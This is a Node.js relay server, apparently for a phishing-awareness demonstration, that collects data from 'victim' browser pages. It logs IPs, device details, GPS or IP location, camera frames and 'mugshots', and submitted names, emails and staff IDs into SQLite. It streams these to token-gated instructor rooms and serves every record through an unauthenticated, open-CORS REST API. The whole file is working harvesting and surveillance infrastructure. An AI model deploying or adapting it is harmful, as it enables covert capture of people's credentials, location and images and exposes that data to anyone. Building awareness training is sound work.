// relay.js — CSA Phishing Awareness Demo · WebSocket Relay Server v2
// ─────────────────────────────────────────────────────────────────────
// Run:    node relay.js
// Run with session label:  SESSION_ID="2026-03-25-AM" node relay.js
//
// Deps:   npm install ws better-sqlite3
//
// ── MULTI-INSTRUCTOR / MULTI-SESSION SUPPORT ─────────────────────────
//
//  Each instructor registers with a token that maps to a session room.
//  Victims that connect are assigned to the active session of any
//  instructor currently online, or to the DEFAULT_SESSION if none.
//
//  Configure INSTRUCTOR_TOKENS as:
//    { 'TOKEN-STRING': 'session-room-label' }
//
//  Example:
//    'CSA-AM-2026'  → 'session_AM'
//    'CSA-PM-2026'  → 'session_PM'
//
//  The victim page does NOT need any token — it just connects.
//  Instructors only receive victims in their own session room.
//
// ── DATA PERSISTENCE ─────────────────────────────────────────────────
//
//  All victim records are stored in SQLite (sessions.db).
//  Each victim row stores: device info, geolocation, form data.
//  A REST endpoint allows reviewing past sessions without re-running.
//
//  GET http://localhost:8766/api/sessions          → list all sessions
//  GET http://localhost:8766/api/sessions/:id      → victim records for session
//
// ─────────────────────────────────────────────────────────────────────

'use strict';

const { WebSocketServer } = require('ws');
const fs = require('fs');
const path = require('path');
const http = require('http');
const Database = require('better-sqlite3');

// ── CONFIG ────────────────────────────────────────────────────────────
const WS_PORT = process.env.WS_PORT ? parseInt(process.env.WS_PORT) : 8765;
const API_PORT = process.env.API_PORT ? parseInt(process.env.API_PORT) : 8766;
const TRUST_PROXY = process.env.TRUST_PROXY !== 'false'; // default true

// Session label for this run — override with SESSION_ID env var.
// Defaults to ISO date+time e.g.  "2026-03-25T09-15"
const DEFAULT_SESSION = process.env.SESSION_ID
  || new Date().toISOString().slice(0, 16).replace(':', '-');

// Per-instructor tokens mapped to session room labels.
// Add as many pairs as you need.  Change these before sharing the repo.
const INSTRUCTOR_TOKENS = {
  'CSA-DEMO-2026': 'default',          // ← original single token kept as "default"
  'CSA-AM-2026': 'session_AM',       // morning cohort
  'CSA-PM-2026': 'session_PM',       // afternoon cohort
};

// SQLite database file (excluded from git via .gitignore)
const DB_FILE = path.join(__dirname, 'sessions.db');

// Log file per session run (excluded from git via .gitignore)
const LOG_FILE = path.join(__dirname, `session-${DEFAULT_SESSION}.log`);
// ─────────────────────────────────────────────────────────────────────

// ── DATABASE SETUP ────────────────────────────────────────────────────
const db = new Database(DB_FILE);

db.exec(`
  CREATE TABLE IF NOT EXISTS victims (
    client_id       TEXT PRIMARY KEY,
    session_id      TEXT NOT NULL,
    ip              TEXT,
    connected_at    TEXT,
    device_json     TEXT,
    location_json   TEXT,
    form_json       TEXT,
    last_frame_at   TEXT
  );

  CREATE INDEX IF NOT EXISTS idx_session ON victims (session_id);
`);

const stmtUpsertVictim = db.prepare(`
  INSERT INTO victims (client_id, session_id, ip, connected_at)
  VALUES (@client_id, @session_id, @ip, @connected_at)
  ON CONFLICT(client_id) DO NOTHING
`);

const stmtUpdateDevice = db.prepare(`
  UPDATE victims SET device_json = @device_json WHERE client_id = @client_id
`);

const stmtUpdateLocation = db.prepare(`
  UPDATE victims SET location_json = @location_json WHERE client_id = @client_id
`);

const stmtUpdateForm = db.prepare(`
  UPDATE victims SET form_json = @form_json WHERE client_id = @client_id
`);

const stmtUpdateFrame = db.prepare(`
  UPDATE victims SET last_frame_at = @last_frame_at WHERE client_id = @client_id
`);

const stmtListSessions = db.prepare(`
  SELECT session_id, COUNT(*) as victim_count, MIN(connected_at) as started_at
  FROM victims GROUP BY session_id ORDER BY started_at DESC
`);

const stmtGetSession = db.prepare(`
  SELECT * FROM victims WHERE session_id = ? ORDER BY connected_at ASC
`);
// ─────────────────────────────────────────────────────────────────────

// ── LOGGING ───────────────────────────────────────────────────────────
function ts() {
  return new Date().toISOString();
}

function log(line) {
  const entry = `[${ts()}] ${line}`;
  console.log(entry);
  fs.appendFileSync(LOG_FILE, entry + '\n');
}
// ─────────────────────────────────────────────────────────────────────

// ── DEVICE PARSING ────────────────────────────────────────────────────
function parseUA(ua = '') {
  const isTablet = /iPad|Tablet|PlayBook/i.test(ua) && !/Mobile/i.test(ua);
  const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const deviceType = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop';

  let os = 'Unknown OS';
  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
  else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Android ([\d.]+)/i.test(ua)) os = `Android ${ua.match(/Android ([\d.]+)/i)[1]}`;
  else if (/iPhone OS ([\d_]+)/i.test(ua)) os = `iOS ${ua.match(/iPhone OS ([\d_]+)/i)[1].replace(/_/g, '.')}`;
  else if (/iPad.*OS ([\d_]+)/i.test(ua)) os = `iPadOS ${ua.match(/iPad.*OS ([\d_]+)/i)[1].replace(/_/g, '.')}`;
  else if (/Mac OS X ([\d_.]+)/i.test(ua)) os = `macOS ${ua.match(/Mac OS X ([\d_.]+)/i)[1].replace(/_/g, '.')}`;
  else if (/Linux/i.test(ua)) os = 'Linux';

  let browser = 'Unknown Browser';
  if (/Edg\/([\d.]+)/i.test(ua)) browser = `Edge ${ua.match(/Edg\/([\d.]+)/i)[1]}`;
  else if (/OPR\/([\d.]+)/i.test(ua)) browser = `Opera ${ua.match(/OPR\/([\d.]+)/i)[1]}`;
  else if (/Chrome\/([\d.]+)/i.test(ua)) browser = `Chrome ${ua.match(/Chrome\/([\d.]+)/i)[1]}`;
  else if (/Firefox\/([\d.]+)/i.test(ua)) browser = `Firefox ${ua.match(/Firefox\/([\d.]+)/i)[1]}`;
  else if (/Version\/([\d.]+).*Safari/i.test(ua)) browser = `Safari ${ua.match(/Version\/([\d.]+)/i)[1]}`;
  else if (/Chromium\/([\d.]+)/i.test(ua)) browser = `Chromium ${ua.match(/Chromium\/([\d.]+)/i)[1]}`;

  return { deviceType, os, browser };
}
// ─────────────────────────────────────────────────────────────────────

// ── IP RESOLUTION ─────────────────────────────────────────────────────
function resolveIP(req) {
  if (TRUST_PROXY) {
    const fwd = req.headers['x-forwarded-for'];
    if (fwd) return fwd.split(',')[0].trim();
    const real = req.headers['x-real-ip'];
    if (real) return real.trim();
  }
  return (req.socket.remoteAddress || 'unknown').replace(/^::ffff:/, '');
}
// ─────────────────────────────────────────────────────────────────────

// ── INSTRUCTOR REGISTRY ───────────────────────────────────────────────
// Map: session_room → Set of live instructor WebSockets
const instructorRooms = new Map();

// ── VICTIM REGISTRY ───────────────────────────────────────────────────
// Set of all connected victim WebSockets (for config broadcasts)
const victimSockets = new Set();

function addInstructor(ws, room) {
  if (!instructorRooms.has(room)) instructorRooms.set(room, new Set());
  instructorRooms.get(room).add(ws);
}

function removeInstructor(ws, room) {
  if (instructorRooms.has(room)) instructorRooms.get(room).delete(ws);
}

function broadcastToRoom(room, payload) {
  const str = JSON.stringify(payload);
  const room_set = instructorRooms.get(room);
  if (!room_set) return;
  for (const ins of room_set) {
    if (ins.readyState === 1) ins.send(str);
  }
}

// Broadcast to ALL instructor rooms (e.g. for global admin view)
function broadcastAll(payload) {
  const str = JSON.stringify(payload);
  for (const room_set of instructorRooms.values()) {
    for (const ins of room_set) {
      if (ins.readyState === 1) ins.send(str);
    }
  }
}

// Broadcast config to all connected victim pages
function broadcastToVictims(payload) {
  const str = JSON.stringify(payload);
  for (const v of victimSockets) {
    if (v.readyState === 1) v.send(str);
  }
}
// ─────────────────────────────────────────────────────────────────────

// ── WEBSOCKET SERVER ──────────────────────────────────────────────────
const wss = new WebSocketServer({ port: WS_PORT });
let clientCounter = 0;

log(`=== CSA Phishing Demo Relay v2 ===`);
log(`WebSocket  : ws://0.0.0.0:${WS_PORT}`);
log(`REST API   : http://0.0.0.0:${API_PORT}/api/sessions`);
log(`Session    : ${DEFAULT_SESSION}`);
log(`DB         : ${DB_FILE}`);
log(`Log file   : ${LOG_FILE}`);
log(`Proxy trust: ${TRUST_PROXY}`);
log(`Instructor tokens configured: ${Object.keys(INSTRUCTOR_TOKENS).length}`);
log('──────────────────────────────────\n');

wss.on('connection', (ws, req) => {
  const ip = resolveIP(req);
  const clientId = `client_${Date.now()}_${++clientCounter}`;
  let role = 'victim';
  let room = null;   // set on instructor registration

  // Track this socket as a victim (will be removed if they register as instructor)
  victimSockets.add(ws);

  // Record victim in DB immediately
  stmtUpsertVictim.run({
    client_id: clientId,
    session_id: DEFAULT_SESSION,
    ip,
    connected_at: ts(),
  });

  log(`[+] CONNECT     ${clientId}  IP=${ip}`);

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }

    // ── INSTRUCTOR REGISTRATION ──────────────────────────────────
    if (msg.type === 'register' && msg.role === 'instructor') {
      const token = msg.token || '';
      if (!INSTRUCTOR_TOKENS[token]) {
        log(`[!] AUTH FAIL   instructor attempt from ${ip} — wrong token "${token}"`);
        ws.send(JSON.stringify({ type: 'auth_error', reason: 'Invalid instructor token' }));
        ws.close();
        return;
      }
      role = 'instructor';
      room = INSTRUCTOR_TOKENS[token];
      victimSockets.delete(ws); // instructor is not a victim
      addInstructor(ws, room);
      log(`[*] INSTRUCTOR  registered from ${ip}  token="${token}"  room="${room}"  (total in room: ${instructorRooms.get(room).size})`);
      ws.send(JSON.stringify({
        type: 'auth_ok',
        session_id: DEFAULT_SESSION,
        room,
      }));
      return;
    }

    // ── DEVICE INFO ──────────────────────────────────────────────
    if (msg.type === 'device_info') {
      const parsed = parseUA(msg.userAgent);
      const enriched = { ...msg, ...parsed, serverIP: ip };
      stmtUpdateDevice.run({
        client_id: clientId,
        device_json: JSON.stringify(enriched),
      });
      log(`[i] DEVICE      ${clientId}  type=${parsed.deviceType}  os=${parsed.os}  browser=${parsed.browser}  ip=${ip}`);
      broadcastAll({
        ...enriched,
        type: 'device_info',
        clientId,
        session_id: DEFAULT_SESSION,
      });
      return;
    }

    // ── LOCATION ─────────────────────────────────────────────────
    if (msg.type === 'location') {
      stmtUpdateLocation.run({
        client_id: clientId,
        location_json: JSON.stringify(msg),
      });
      const src = msg.source === 'GPS'
        ? `GPS ${msg.latitude?.toFixed(5)}, ${msg.longitude?.toFixed(5)} ±${Math.round(msg.accuracy || 0)}m`
        : `IP  ${msg.city}, ${msg.country} (${msg.ip})`;
      log(`[*] LOCATION    ${clientId}  [${msg.source}]  ${src}`);
      log(`    Maps: ${msg.mapsLink}`);
      broadcastAll({ ...msg, clientId, serverIP: ip, session_id: DEFAULT_SESSION });
      return;
    }

    // ── CAMERA FRAMES & MUGSHOTS ─────────────────────────────────
    if (msg.type === 'frame') {
      stmtUpdateFrame.run({ client_id: clientId, last_frame_at: ts() });
      broadcastAll({ ...msg, clientId, serverIP: ip, session_id: DEFAULT_SESSION });
      return;
    }

    if (msg.type === 'mugshot') {
      log(`[*] MUGSHOT     ${clientId}  high-res capture received`);
      broadcastAll({ ...msg, clientId, serverIP: ip, session_id: DEFAULT_SESSION });
      return;
    }

    // ── FORM DATA (credential harvest demo) ──────────────────────
    if (msg.type === 'form_data') {
      stmtUpdateForm.run({
        client_id: clientId,
        form_json: JSON.stringify({
          fullName: msg.fullName,
          email: msg.email,
          staffId: msg.staffId,
        }),
      });
      log(`[!] FORM        ${clientId}  ip=${ip}  name="${msg.fullName}"  email="${msg.email}"  staffId="${msg.staffId}"`);
      broadcastAll({ ...msg, clientId, serverIP: ip, session_id: DEFAULT_SESSION });
      return;
    }

    // ── CONFIG UPDATE (instructor → victims) ─────────────────────
    if (msg.type === 'config_update' && role === 'instructor') {
      log(`[*] CONFIG      instructor updated event config: date="${msg.eventDate}" time="${msg.eventTime}" venue="${msg.eventVenue}"`);
      broadcastToVictims({
        type: 'config_update',
        eventDate: msg.eventDate,
        eventTime: msg.eventTime,
        eventVenue: msg.eventVenue,
      });
      return;
    }
  });

  ws.on('close', () => {
    log(`[-] DISCONNECT  ${clientId}  ip=${ip}`);
    victimSockets.delete(ws);
    if (role === 'instructor' && room) removeInstructor(ws, room);
  });

  ws.on('error', (err) => {
    log(`[!] ERROR       ${clientId}  ${err.message}`);
  });
});
// ─────────────────────────────────────────────────────────────────────

// ── REST API SERVER ───────────────────────────────────────────────────
const apiServer = http.createServer((req, res) => {
  const url = req.url.split('?')[0];

  // CORS headers (allow instructor.html opened as file://)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Content-Type', 'application/json');

  // GET /api/sessions  — list all session IDs
  if (req.method === 'GET' && url === '/api/sessions') {
    const rows = stmtListSessions.all();
    res.end(JSON.stringify({ sessions: rows }));
    return;
  }

  // GET /api/sessions/:id  — get all victims for a session
  const match = url.match(/^\/api\/sessions\/(.+)$/);
  if (req.method === 'GET' && match) {
    const sessionId = decodeURIComponent(match[1]);
    const rows = stmtGetSession.all(sessionId).map(r => ({
      clientId: r.client_id,
      session_id: r.session_id,
      ip: r.ip,
      connectedAt: r.connected_at,
      device: r.device_json ? JSON.parse(r.device_json) : null,
      location: r.location_json ? JSON.parse(r.location_json) : null,
      form: r.form_json ? JSON.parse(r.form_json) : null,
      lastFrameAt: r.last_frame_at,
    }));
    res.end(JSON.stringify({ session_id: sessionId, victims: rows }));
    return;
  }

  // GET /api/current  — quick shortcut: victims in this run's session
  if (req.method === 'GET' && url === '/api/current') {
    const rows = stmtGetSession.all(DEFAULT_SESSION).map(r => ({
      clientId: r.client_id,
      ip: r.ip,
      connectedAt: r.connected_at,
      device: r.device_json ? JSON.parse(r.device_json) : null,
      location: r.location_json ? JSON.parse(r.location_json) : null,
      form: r.form_json ? JSON.parse(r.form_json) : null,
      lastFrameAt: r.last_frame_at,
    }));
    res.end(JSON.stringify({ session_id: DEFAULT_SESSION, victims: rows }));
    return;
  }

  res.statusCode = 404;
  res.end(JSON.stringify({ error: 'Not found' }));
});

apiServer.listen(API_PORT, () => {
  log(`REST API listening on http://0.0.0.0:${API_PORT}`);
});
